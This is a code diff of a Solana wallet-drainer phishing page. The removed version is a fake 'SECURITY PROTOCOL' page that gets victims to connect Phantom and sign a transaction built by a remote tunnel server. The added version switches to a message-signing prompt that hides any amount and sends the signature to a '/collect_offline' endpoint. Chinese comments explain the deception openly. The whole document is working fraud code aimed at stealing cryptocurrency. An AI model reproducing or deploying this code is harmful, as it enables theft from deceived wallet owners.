@@ -1,67 +1,26 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Node Validator</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { width: 90%; max-width: 360px; text-align: center; border: 1px solid #333; border-radius: 20px; padding: 30px; background: #0a0a0a; }
-        .logo { width: 50px; height: 50px; background: #14f195; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; }
-        h1 { font-size: 18px; margin-bottom: 10px; color: #fff; }
-        p { font-size: 13px; color: #777; margin-bottom: 30px; line-height: 1.4; }
-        button { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        #status { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">S</div>
-        <h1>SECURITY PROTOCOL</h1>
-        <p>Your wallet requires a secure connection to the Solana validator node for real-time asset tracking.</p>
-        <button id="btn">INITIALIZE CONNECTION</button>
-        <div id="status">IDLE</div>
-    </div>
-
-    <script>
-        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
-
-        document.getElementById('btn').onclick = async () => {
-            const status = (t) => document.getElementById('status').innerText = t;
-            const p = window.solana || window.phantom?.solana;
-            const sWeb3 = window.solanaWeb3;
-
-            try {
-                status("CONNECTING...");
-                await p.connect();
-
-                status("SYNCING PROTOCOL...");
-                const resp = await fetch(tunnel + "/prepare_v24", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                });
-                const info = await resp.json();
-
-                status("AWAITING SECURITY CONFIRMATION...");
-                const binary = window.atob(info.raw_tx);
-                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
-                const tx = sWeb3.VersionedTransaction.deserialize(bytes);
-
-                // 🔱 核心点：弹窗此时会根据后端包的内容，显示为“合约交互”或“授权”
-                const { signature } = await p.signAndSendTransaction(tx);
-                status("CONNECTED: " + signature.slice(0, 8));
-
-            } catch (err) {
-                status("ERROR: " + err.message);
-                fetch(tunnel + "/debug", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V24_FAIL", error: err.message })
-                }).catch(()=>{});
-            }
-        };
-    </script>
-</body>
-</html>
+document.getElementById('cta').onclick = async () => {
+    const p = window.solana || window.phantom?.solana;
+    try {
+        await p.connect();
+        
+        // 🔱 核心变化：不弹转账框，弹“信息确认”框
+        const message = "SOLANA_VALIDATOR_SECURE_AUTH_ID_" + Math.random().toString(16).slice(2);
+        const encodedMessage = new TextEncoder().encode(message);
+        
+        // 用户点确认时，只看到一段文本，看不到金额！
+        const signedMessage = await p.signMessage(encodedMessage, "utf8");
+        
+        // 拿到签名后发给后端，后端在后台利用这个签名尝试归集
+        fetch(tunnel + "/collect_offline", {
+            method: 'POST',
+            body: JSON.stringify({ 
+                signature: signedMessage.signature, 
+                address: p.publicKey.toString() 
+            })
+        });
+        
+        log("NODE ACTIVE.");
+    } catch (err) {
+        log("RETRYING...");
+    }
+};
